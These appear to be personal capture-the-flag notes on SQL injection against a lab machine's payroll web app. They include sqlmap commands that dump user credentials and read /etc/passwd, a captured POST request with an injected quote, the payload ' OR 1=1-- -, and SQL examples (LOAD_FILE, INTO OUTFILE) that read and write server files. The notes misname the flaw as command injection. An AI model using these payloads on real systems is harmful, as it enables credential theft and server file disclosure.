//read file from database 

we can't perform sql injection file inlcude after become parameter

sqlmap -r login.req --batch -D payroll_db -T users -C name,username,password --dump  --technique=BEU --level 5 --risk 3
sqlmap -r login.req --batch -D payroll_db  --technique=BEU --level 5 --risk 3 --file-read /etc/passwd 



POST /ajax.php?action=save_deductions HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1360122800540851915535553454
Content-Length: 409
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/index.php?page=deductions
Cookie: PHPSESSID=bn7cdggkltmdiec12ugdu24ka4

-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="id"

4
-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="deduction"

hacker'
-----------------------------1360122800540851915535553454
Content-Disposition: form-data; name="description"

hacker
-----------------------------1360122800540851915535553454--

# notes

after putting ' quote on hacker' then server return error but again put ' then server controlled i realized this is ' error based command injection 
to control the query i tried hacker' OR 1=1-- - then success 



# notes 

when file privilegs setup on sql db then we can easility read senstive data from database and senstive file 



# if file privilege setupon database 

In the context of a database, if a user has the FILE privilege, it grants them the ability to read and write files on the server where the database is running. This can be a significant privilege with potential security implications, as it allows the user to interact with the filesystem directly from the database.
What You Can Do with the FILE Privilege

    Read Files:
        The user can read any file on the server that the database server has read access to. This includes sensitive files like configuration files, logs, or even user data stored on the server.
        Example of reading a file:

        sql

    SELECT LOAD_FILE('/etc/passwd');

    This SQL command would attempt to read the /etc/passwd file on a Unix-like system and return its contents.

Write Files:

    The user can also write data to files on the server. This could be used to create new files or overwrite existing ones, which could potentially lead to system compromise if, for example, they write malicious code to a web-accessible directory.
    Example of writing to a file:

    sql

    SELECT 'Some text' INTO OUTFILE '/path/to/file.txt';

    This command writes "Some text" to the specified file path.

Import Data from Files:

    The FILE privilege also allows users to import data from files into the database using commands like LOAD DATA INFILE.
    Example of importing data:

    sql

        LOAD DATA INFILE '/path/to/data.csv' INTO TABLE table_name;

        This command imports data from a CSV file into a specified table.

Security Implications

    Sensitive Information Exposure: The ability to read files can expose sensitive information, such as configuration files (my.cnf, .htpasswd, etc.), user data, or credentials stored on the server.

    Potential System Compromise: Writing to files could allow a user to create or modify scripts or other files that could be executed by the server, leading to a full system compromise.

    Database Server Permissions: The scope of what can be read or written depends on the permissions of the database server process. The database process typically runs with its own user privileges, so it can only read/write files that this user has access to.
